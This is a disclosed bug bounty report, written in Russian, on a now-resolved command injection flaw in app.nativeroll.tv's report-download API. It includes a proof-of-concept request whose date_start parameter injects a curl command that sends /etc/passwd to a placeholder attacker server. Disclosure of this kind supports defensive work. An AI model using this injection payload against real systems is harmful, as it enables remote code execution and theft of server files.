---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1348154'
original_report_id: '1348154'
title: RCE в .api/nr/report/{id}/download
weakness: Code Injection
team_handle: mailru
created_at: '2021-09-22T10:57:01.131Z'
disclosed_at: '2022-03-18T09:03:38.728Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 6
asset_identifier: NATIVEROLL
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- code-injection
---

# RCE в .api/nr/report/{id}/download

## Metadata

- HackerOne Report ID: 1348154
- Weakness: Code Injection
- Program: mailru
- Disclosed At: 2022-03-18T09:03:38.728Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Domain, site, application
--
app.nativeroll.tv

Steps to reproduce
--
Нужен аккаунт рекламодателя, можно зарегистрировать здесь https://seedr.ru/register-user/advertiser
1. Войти как рекламодатель https://seedr.ru/login/advertiser
2. Пощелкать что-нибудь, поперехватывать запросы, нужен access_token
3. Отправить следующий запрос (заменить токен и адрес сервера), рце уязвимость стриггерится в параметре date_start. 
Запрос отправит содержимое файла /etc/password на контролируемый сервер. 6148ae42362be67fc9433c40 - campaign id, должен быть валидным, нашел на одном из скринов в репорте с доступом в почтовую админку. Также уязвимым параметром является date_end, для примера можно просто заменить date_start в запросе на date_end. 

```
GET /api/nr/report/6148ae42362be67fc9433c40/download?access_token=TOKEN&format=pdf&date_start=%60curl%20-F%22file=@/etc/passwd%22%20YOURSERVER.COM%60 HTTP/1.1
Host: app.nativeroll.tv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```

Ответ приходит с адреса 95.213.212.220 https://censys.io/ipv4/95.213.212.220, видно, что это host220.seedr.ru или  же nativeroll.tv

## Impact

Атакующий может исполнять произвольный код на сервере со всеми отсюда вытекающими последствиями

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
